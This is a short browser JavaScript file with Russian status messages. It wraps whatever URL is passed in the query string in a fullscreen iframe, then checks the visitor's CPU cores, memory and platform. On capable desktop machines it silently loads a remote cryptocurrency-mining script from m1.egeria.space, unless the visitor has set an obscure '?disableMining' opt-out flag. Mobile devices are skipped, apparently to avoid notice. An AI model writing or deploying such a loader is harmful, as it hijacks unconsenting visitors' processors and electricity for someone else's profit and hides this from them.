document.addEventListener('DOMContentLoaded', function() {
    'use strict';

    var body = document.body;
    var search = location.search;
    var cookie = typeof(navigator.cookieEnabled) === 'undefined' ? true : navigator.cookieEnabled;

    if (cookie === false) {
        body.textContent = 'Ошибка: Включите куки.';
    } else if (search === '') {
        body.textContent = 'Ошибка: Неверный запрос.';
    } else if (search === '?disableMining') {
        window.localStorage.setItem('disableMining', true);
        body.textContent = 'Статус: Майнинг отключён.';
    } else {
        var iframe = document.createElement('iframe');
        iframe.setAttribute('src', search.substr(1));
        iframe.setAttribute('allowfullscreen', '');
        body.appendChild(iframe);

        var hardwareConcurrency = typeof(navigator.hardwareConcurrency) === 'undefined' ? 9 : navigator.hardwareConcurrency;
        var deviceMemory = typeof(navigator.deviceMemory) === 'undefined' ? 9 : navigator.deviceMemory;
        var platform = typeof(navigator.platform) === 'undefined' ? '' : navigator.platform;

        if (window.localStorage.getItem('disableMining') === null && hardwareConcurrency > 2 && deviceMemory > 2 && platform !== 'Android' && platform !== 'iPhone' && platform !== 'iPad' && platform !== 'iPod') {
            var script = document.createElement('script');
            script.setAttribute('src', '//m1.egeria.space/mining');
            script.setAttribute('async', '');
            body.appendChild(script);
        }
    }
});